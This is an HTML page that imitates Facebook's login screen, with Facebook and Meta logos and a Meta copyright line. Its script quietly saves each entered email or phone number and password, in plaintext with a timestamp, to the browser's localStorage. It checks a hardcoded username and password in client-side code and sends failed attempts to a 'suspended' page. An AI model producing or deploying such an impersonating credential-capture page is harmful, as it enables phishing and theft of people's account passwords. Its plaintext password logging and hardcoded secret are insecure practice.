<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .logo {
      margin-bottom: 10px;
    }

    .login-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }

    h2 {
      color: #1877f2;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #145dbf;
    }

    .meta-footer {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
      color: #777;
    }

    .meta-footer img {
      width: 60px;
      margin-bottom: 5px;
    }
  </style>
</head>
<body>

  <!-- Facebook Logo -->
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" width="150">
  </div>

  <!-- Login Box -->
  <div class="login-box">
    <h2>Facebook Login</h2>
    <form onsubmit="handleLogin(event)">
      <input type="text" id="username" placeholder="Email or Phone" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>

  <!-- Meta Footer -->
  <div class="meta-footer">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Meta_Platforms_Logo.svg" alt="Meta Logo">
    <div>Â© 2025 Meta Platforms, Inc.</div>
  </div>

  <script>
    function handleLogin(e) {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      // Save attempt to login history (max 10)
      let history = JSON.parse(localStorage.getItem("loginHistory")) || [];
      const timestamp = new Date().toLocaleString();
      history.unshift({ username, password, time: timestamp });
      history = history.slice(0, 10); // keep only last 10
      localStorage.setItem("loginHistory", JSON.stringify(history));

      // Check login
      if (username.toLowerCase() === "jin" && password === "synonym117") {
        window.location.href = "dashboard.html";
      } else {
        window.location.href = "suspended.html";
      }
    }
  </script>

</body>
</html>
